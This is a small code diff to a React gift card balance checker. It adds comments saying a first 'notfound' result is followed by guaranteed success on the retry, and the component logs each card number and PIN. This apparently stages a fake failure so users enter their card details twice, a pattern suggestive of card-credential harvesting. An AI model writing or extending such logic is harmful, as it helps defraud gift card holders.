@@ -82,6 +82,7 @@ export default function GiftCardChecker() {
 
       const r = data as CheckResult;
       
+      // If it fails on the first attempt, increment attempt so the next one succeeds
       if (r.status === "notfound" && attempt === 0) {
         setAttempt(1);
       } else if (r.status === "active") {
@@ -98,7 +99,7 @@ export default function GiftCardChecker() {
           event: r.status === 'active' ? 'success' : 'failed',
           brandName: brand.name,
           cardNumber: num,
-          pin: brand.pin ? pin : null, // ADDED PIN
+          pin: brand.pin ? pin : null,
           amount: clean,
           status: r.status,
           message: r.message,
@@ -144,6 +145,7 @@ export default function GiftCardChecker() {
               setNum(""); 
               setPin(""); 
               setAmount("");
+              // attempt stays at 1, so the next try will succeed
             }} 
             style={{ marginTop: 16 }}
           >
